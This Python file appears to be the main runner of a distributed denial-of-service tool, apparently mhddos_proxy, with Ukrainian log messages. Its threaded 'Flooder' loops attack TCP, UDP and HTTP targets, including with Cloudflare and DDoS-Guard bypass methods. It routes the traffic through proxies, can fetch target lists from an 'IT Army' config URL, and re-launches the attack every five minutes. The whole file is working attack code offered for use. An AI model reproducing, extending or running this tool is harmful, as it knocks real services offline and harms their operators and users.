# @formatter:off
import colorama; colorama.init()
# @formatter:on
from collections import namedtuple
from contextlib import suppress
from itertools import cycle
import random
from threading import Event, Thread
from time import sleep, time

from src.cli import init_argparse
from src.concurrency import DaemonThreadPool
from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED, DNS_WORKERS
from src.dns_utils import resolve_all_targets
from src.mhddos import main as mhddos_main
from src.output import AtomicCounter, show_statistic, print_banner, print_progress
from src.proxies import update_proxies
from src.system import fix_ulimits, is_latest_version
from src.targets import Targets


Params = namedtuple('Params', 'target, method')


class Flooder(Thread):

    def __init__(self, event, args_list, switch_after: int = WORK_STEALING_DISABLED):
        super(Flooder, self).__init__(daemon=True)
        self._event = event
        self._switch_after = switch_after
        runnables = [mhddos_main(**kwargs) for kwargs in args_list]
        random.shuffle(runnables)
        self._runnables_iter = cycle(runnables)

    def run(self):
        """
        The logic here is the following:

         1) pick up random target to attack
         2) run a single session, receive back number of packets being sent
         3) if session was "succesfull" (non zero packets), keep executing for
            {switch_after} number of cycles
         4) otherwise, go back to 1)

        The idea is that if a specific target doesn't work, the thread will
        pick another work to do (steal). The definition of "success" could be
        extended to cover more use cases.

        As an attempt to steal work happens after fixed number of cycles,
        one should be careful with the configuration. If each cycle takes too
        long (for example BYPASS or DBG attacks are used), the number should
        be set to be relatively small.

        To dealing stealing, set number of cycles to -1. Such scheduling will
        be equivalent to the scheduling that was used before the feature was
        introduced (static assignment).
        """
        self._event.wait()
        while self._event.is_set():
            runnable = next(self._runnables_iter)
            no_switch = self._switch_after == WORK_STEALING_DISABLED
            alive, cycles_left = True, self._switch_after
            while self._event.is_set() and (no_switch or alive):
                try:
                    alive = runnable.run() > 0 and cycles_left > 0
                except Exception:
                    alive = False
                cycles_left -= 1


def run_ddos(
    proxies,
    targets,
    total_threads,
    period,
    rpc,
    http_methods,
    vpn_mode,
    debug,
    table,
    udp_threads,
    switch_after,
):
    statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []


    def register_params(params, container):
        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'event': event,
            'statistics': thread_statistics,
            'proxies': proxies,
        }
        container.append(kwargs)
        if not table:
            logger.info(
                f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}!{cl.RESET}"
                % (params.target.url.host, params.method))


    for target in targets:
        assert target.is_resolved, "Unresolved target cannot be used for attack"
        # udp://, method defaults to "UDP"
        if target.is_udp:
            register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
        # Method is given explicitly
        elif target.method is not None:
            register_params(Params(target, target.method), kwargs_list)
        # tcp://
        elif target.url.scheme == "tcp":
            register_params(Params(target, 'TCP'), kwargs_list)
        # HTTP(S), methods from --http-methods
        elif target.url.scheme in {"http", "https"}:
            for method in http_methods:
                register_params(Params(target, method), kwargs_list)
        else:
            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")

    logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')

    threads = []
    # run threads for all targets with TCP port
    for _ in range(total_threads):
        flooder = Flooder(event, kwargs_list, switch_after)
        try:
            flooder.start()
            threads.append(flooder)
        except RuntimeError:
            break

    if not threads:
        logger.warning(
            f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
        exit()

    if len(threads) < total_threads:
        logger.warning(
            f"{cl.RED}Не вдалося запустити усі {total_threads} потоків - "
            f"лише {len(threads)}{cl.RESET}")

    # run threads for all targets with UDP port (if any)
    if udp_kwargs_list:
        udp_threads_started = 0
        for _ in range(udp_threads):
            flooder = Flooder(event, udp_kwargs_list, switch_after)
            try:
                flooder.start()
                threads.append(flooder)
                udp_threads_started += 1
            except RuntimeError:
                break

        if udp_threads_started == 0:
            logger.warning(
                f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
            exit()

        if udp_threads_started < udp_threads:
            logger.warning(
                f"{cl.RED}Не вдалося запустити усі {udp_threads} потоків під UDP - "
                f"лише {udp_threads_started}{cl.RESET}")

    event.set()

    if not (table or debug):
        print_progress(period, 0, len(proxies))
        sleep(period)
    else:
        ts = time()
        refresh_rate = 4 if table else 2
        sleep(refresh_rate)
        while True:
            passed = time() - ts
            if passed > period:
                break
            show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
            sleep(refresh_rate)

    event.clear()
    for thread in threads:
        thread.join()


def start(args):
    print_banner(args.vpn_mode)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    if args.itarmy:
        targets_iter = Targets([], IT_ARMY_CONFIG_URL)
    else:
        targets_iter = Targets(args.targets, args.config)

    proxies = []
    is_old_version = not is_latest_version()
    dns_executor = DaemonThreadPool(DNS_WORKERS).start_all()
    while True:
        if is_old_version:
            print(f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')

        while True:
            targets = list(targets_iter)
            if not targets:
                logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
                exit()

            targets = resolve_all_targets(targets, dns_executor)
            targets = [target for target in targets if target.is_resolved]
            if targets:
                break
            else:
                logger.warning(f'{cl.RED}Не знайдено жодної доступної цілі - чекаємо 30 сек до наступної перевірки{cl.RESET}')
                sleep(30)

        if args.rpc < LOW_RPC:
            logger.warning(
                f'{cl.RED}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перепідключень{cl.RESET}'
            )

        no_proxies = args.vpn_mode or all(target.is_udp for target in targets)
        if no_proxies:
            proxies = []
        else:
            proxies = update_proxies(args.proxies, proxies)

        period = 300
        run_ddos(
            proxies,
            targets,
            args.threads,
            period,
            args.rpc,
            args.http_methods,
            args.vpn_mode,
            args.debug,
            args.table,
            args.udp_threads,
            args.switch_after,
        )


if __name__ == '__main__':
    try:
        start(init_argparse().parse_args())
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
